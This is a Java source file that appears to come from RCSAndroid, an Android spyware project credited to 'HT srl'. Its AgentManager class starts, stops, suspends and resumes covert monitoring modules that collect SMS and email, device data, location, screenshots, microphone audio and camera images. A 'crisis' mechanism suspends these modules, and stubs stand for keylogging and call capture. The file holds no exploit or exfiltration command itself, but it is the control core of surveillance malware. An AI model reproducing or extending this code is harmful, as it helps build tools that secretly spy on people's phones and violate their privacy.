/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI.agent;

import java.util.HashMap;
import java.util.Iterator;

import android.util.Log;

import com.ht.RCSAndroidGUI.Manager;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class AgentManager.
 */
public class AgentManager extends Manager<AgentBase> {

	/** The Constant TAG. */
	private static final String TAG = "AgentManager";

	/** The singleton. */
	private volatile static AgentManager singleton;

	/**
	 * Self.
	 * 
	 * @return the agent manager
	 */
	public static AgentManager self() {
		if (singleton == null) {
			synchronized (AgentManager.class) {
				if (singleton == null) {
					singleton = new AgentManager();
				}
			}
		}

		return singleton;
	}

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	private AgentBase factory(final int key) {
		AgentBase a = null;

		if (running.containsKey(key) == true) {
			return running.get(key);
		}

		switch (key) {
		case AgentConf.AGENT_SMS:
			a = new MessageAgent();
			break;

		case AgentConf.AGENT_TASK:
			break;

		case AgentConf.AGENT_CALLLIST:
			break;

		case AgentConf.AGENT_DEVICE:
			a = new DeviceAgent();
			break;

		case AgentConf.AGENT_POSITION:
			a = new PositionAgent();
			break;

		case AgentConf.AGENT_CALL:
			break;

		case AgentConf.AGENT_CALL_LOCAL:
			break;

		case AgentConf.AGENT_KEYLOG:
			break;

		case AgentConf.AGENT_SNAPSHOT:
			a = new SnapshotAgent();
			break;

		case AgentConf.AGENT_URL:
			break;

		case AgentConf.AGENT_IM:
			break;

		case AgentConf.AGENT_EMAIL:
			a = new MessageAgent();
			break;

		case AgentConf.AGENT_MIC:
			a = new MicAgent();
			break;

		case AgentConf.AGENT_CAM:
			a = new CameraAgent();
			break;

		case AgentConf.AGENT_CLIPBOARD:
			break;

		case AgentConf.AGENT_CRISIS:
			a = new CrisisAgent();
			break;

		case AgentConf.AGENT_APPLICATION:
			break;

		default:
			break;
		}

		if (a != null) {
			running.put(key, a);
		}

		return a;
	}

	/**
	 * Start agents.
	 * 
	 * @return true, if successful
	 */
	public boolean startAll() {
		HashMap<Integer, AgentConf> agents;
		agents = status.getAgentsMap();

		if (agents == null) {
			Log.d(TAG, "Agents map null");
			return false;
		}

		if (running == null) {
			Log.d(TAG, "Running Agents map null");
			return false;
		}

		final Iterator<Integer> it = agents.keySet().iterator();

		while (it.hasNext()) {
			final Integer key = it.next();
			AgentConf conf = agents.get(key);
			if(conf.isEnabled()){
				start(key);
			}
		}

		return true;
	}

	// Deve essere bloccante. Attende l'effettivo stop di tutto.
	/**
	 * Stop agents.
	 */
	public void stopAll() {
		HashMap<Integer, AgentConf> agents;
		agents = status.getAgentsMap();
		final Iterator<Integer> it = agents.keySet().iterator();

		while (it.hasNext()) {
			final Integer key = it.next();
			stop(key);
		}
		
		running.clear();
		threads.clear();
	}

	/**
	 * Start agent.
	 * 
	 * @param key
	 *            the key
	 */
	public synchronized void start(final int key) {
		HashMap<Integer, AgentConf> agents;

		agents = status.getAgentsMap();

		if (agents == null) {
			Log.d(TAG, "Agents map null");
			return;
		}

		if (running == null) {
			Log.d(TAG, "Running Agents map null");
			return;
		}

		AgentBase a = factory(key);

		if (a == null) {
			return;
		}

		// Agent mapped and running
		if (a.getStatus() == AgentConf.AGENT_RUNNING) {
			Log.d(TAG, "Agent " + key + " is already running");
			return;
		}

		// start() will NEVER be valid again on a stopped thread
		// so unmap and restart the thread
		if (a.getStatus() == AgentConf.AGENT_STOPPED) {
			// running.remove(key);
			a = factory(key);
		}

		Check.asserts(a != null, "null agent");
		Check.asserts(running.get(key) != null, "null running");

		a.parse(agents.get(key).getParams());

		final Thread t = new Thread(a);
		threads.put(a, t);
		t.start();

	}

	/**
	 * Stop agent.
	 * 
	 * @param key
	 *            the key
	 */
	public synchronized void stop(final int key) {
		final AgentBase a = running.get(key);
		if (a == null) {
			Log.d(TAG, "Agent " + key + " not present");
			return;
		}

		a.stopThread();
		running.remove(key);

		final Thread t = threads.get(a);
		if (t != null) {
			try {
				t.join();
			} catch (final InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		threads.remove(a);
	}

	/**
	 * Suspend an agent, used by crisis
	 * 
	 * @param key
	 *            the key
	 */
	public void suspend(int key) {
		final AgentBase a = running.get(key);
		if (a == null) {
			Log.d(TAG, "Agent " + key + " not present");
			return;
		}

		// suspending a thread implies a stop
		a.suspend();

		final Thread t = threads.get(a);
		if (t != null) {
			try {
				t.join();
			} catch (final InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		threads.remove(a);

	}

	/**
	 * Resume an agent, only if suspended
	 * 
	 * @param key
	 *            the key
	 */
	public void resume(int key) {
		final AgentBase a = running.get(key);
		if (a == null) {
			Log.d(TAG, "Agent " + key + " not present");
			return;
		}

		if (a.isSuspended()) {
			// this clean the suspendend status
			a.resume();

			// start a new thread and restart the loop.
			final Thread t = new Thread(a);
			threads.put(a, t);
			t.start();

		}
	}

}
